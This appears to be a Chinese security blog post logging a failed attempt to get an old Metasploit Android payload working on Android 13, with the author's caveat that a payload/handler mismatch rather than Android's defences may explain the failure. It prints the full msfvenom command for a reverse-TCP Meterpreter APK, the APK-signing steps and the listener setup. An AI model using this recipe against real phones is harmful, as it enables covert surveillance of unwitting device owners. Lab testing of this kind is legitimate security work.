ailx10说：这篇是在2024年3月之前写的，后来又改过。前面在旧安卓环境里试过监控样本，这次换到安卓 13，又想看看同一套老办法会遇到什么。签名、安装提示、旧版应用警告一路接着出现，最终没有拿到预期会话，这个结果让我当时挺感慨。文章就按安装到运行的顺序把现象记下来，和早先实验放在一起看，能看见环境已经在变。题目写得有点夸张，真正值得留下的，是一次旧样本在新系统里处处碰壁的过程，而不是凭一个结果把所有手机安全问题都下结论。

---

安卓13签名安装旧Metasploit APK，出现风险与旧版提示、会话失败，作者认为系统抵御了监控。

## 结论与待核验条件

生成staged与handler stageless写法不一致，失败可能载荷配置或兼容问题，不能推出安卓13全面防御。

## 历史实验记录

作者在安卓 13 上尝试安装旧版 Metasploit 载荷，观察到风险提示及会话建立失败。载荷类型、监听配置和系统兼容性均可能影响结果；单次失败不能证明系统可以防御所有监控木马。

（1）metasploit![原文图表](/notes-assets/1dcd026e3db7a86275be.svg) 生成监控木马

```
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.102 lport=3333 R > ailx10-2024.apk
```

![](/notes-assets/44e14656654d2d2d47ba.webp)

（2）安装依赖，为签名做准备

```
sudo apt-get install zipalign

sudo apt install apksigner
```

（3）生成密钥![原文图表](/notes-assets/1dcd026e3db7a86275be.svg)对

```
keytool -genkey -v -keystore cg.keystore -alias cg -keyalg RSA -keysize 2048 -validity 10000
```

![](/notes-assets/354cc927bf0b6ba193a6.webp)

（4）对app进行签名，签名之后app变大了

```
apksigner sign --ks cg.keystore --ks-key-alias cg ailx10-2024.apk
```

![](/notes-assets/edbc7650c4e4aeca2d8b.webp)

（5）验证app的签名

```
apksigner verify -v --print-certs ailx10-2024.apk
```

![](/notes-assets/d73d3d2216732c27f0c6.webp)

（6）无视风险安装app

![](/notes-assets/16dd0105fcef71a43bea.webp)

![](/notes-assets/e94480c6093575a0bffd.webp)

（7）运行app，显示此应用专为旧版Android打造

![](/notes-assets/5e7b0261afc0c6dbccd3.webp)

（8）监听端会话建立失败：这是本次实验结果，原因仍需核对载荷类型、配置和系统兼容性。

```
use exploit/multi/handler

set lhost 192.168.0.102

set lport 3333

set payload android/meterpreter_reverse_tcp

run
```

![](/notes-assets/9af5535176a18cb4f463.webp)

一次没连上，不能替整代系统宣布胜利。载荷类型与接收端是否匹配、应用兼容和权限怎样，都是比口号更具体、也更值得继续查的问题。
